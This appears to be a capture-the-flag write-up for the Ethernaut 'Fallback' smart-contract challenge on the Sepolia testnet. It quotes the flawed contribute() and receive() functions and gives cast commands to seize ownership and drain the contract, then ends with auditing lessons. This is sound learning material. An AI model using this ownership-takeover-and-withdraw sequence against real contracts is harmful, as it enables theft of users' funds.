# Ethernaut Challenge 01 — Fallback

Claim ownership of the contract and drain all its funds.

Instance address:

```
[To be filled with your instance address]
```

---

## 🎯 Goal

1. Claim ownership of the contract
2. Withdraw all the contract's balance

---

## 🔎 Reading the Contract

There are two ways to become the owner:

### Path 1 — `contribute()`

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

You'd need to contribute more than the owner's 1000 ETH — one tiny contribution at a time. This would take **over 1 million transactions**. Not practical.

### Path 2 — `receive()` ✅

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

This is the shortcut. If you:
1. Have **any** contribution (even 1 wei via `contribute()`)
2. Send **any** ETH directly to the contract

...you become the owner instantly.

---

## 🧠 Attack Strategy

1. Call `contribute()` with a small amount (< 0.001 ETH) to register a contribution
2. Send ETH directly to the contract to trigger `receive()` and become owner
3. Call `withdraw()` to drain all funds

---

## 💻 Solution

### Using Foundry (cast)

```bash
# Step 1: Contribute
cast send $INSTANCE "contribute()" \
  --value 0.0001ether \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut

# Step 2: Trigger receive() to become owner
cast send $INSTANCE \
  --value 0.0001ether \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut

# Step 3: Withdraw everything
cast send $INSTANCE "withdraw()" \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

### Using Forge Script

```bash
forge script script/01-Fallback.s.sol --rpc-url sepolia --broadcast -vvvv
```

The [script](../../script/01-Fallback.s.sol) executes all three steps in a single transaction batch.

---

## 🛡️ Key Takeaway

- `receive()` and `fallback()` functions can contain critical logic — always audit them carefully
- Ownership transfer should never happen in a fallback function
- The `receive()` function is triggered by plain ETH transfers with no calldata

---

## 📜 My Transaction

https://sepolia.etherscan.io/tx/0xdac861e98632758efbc1d9dcb24899bc35bf9ec8eebb54d41a3dc496ce1b40de
